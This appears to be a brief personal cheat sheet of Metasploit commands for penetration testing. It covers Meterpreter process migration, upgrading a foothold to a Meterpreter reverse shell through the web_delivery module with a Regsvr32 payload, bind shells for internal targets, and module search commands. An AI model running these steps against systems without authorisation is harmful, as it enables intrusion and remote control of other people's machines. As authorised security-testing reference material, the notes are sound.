# Metasploit
### Process Migrate
#### Meterpreter
* `migrate -N <process/PID>`<br>
_Needed when running as **NT AUTHORITY\SYSTEM** but get Access Denied_

### Shell Upgrade
#### Metasploit **web_delivery** module
1. Select module
   * `use exploit/multi/script/web_delivery`
2. set `lhost`
3. set target
   * `show targets`
   * `set target Regsvr32` - creates a payload to run on windows
4. set payload
   * `set payload windows/meterpreter/reverse_tcp`
5. Run command on already infected host to gain **Meterpreter** shell

### Exploiting targets in the internal network
* `set PAYLOAD windows/meterpreter/bind_tcp` - `reverse_tcp` shells won't work because internal target is not accessible from attacker machine

### General Commands
* `search <exploit-key-word>` - search exploits based on keywords
* `show targets` - show available targets
* `show payloads` - show available payloads
* `info` - extra details about the module selected

## Cool resources
https://book.hacktricks.xyz/shells/shells/windows#regsvr32
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
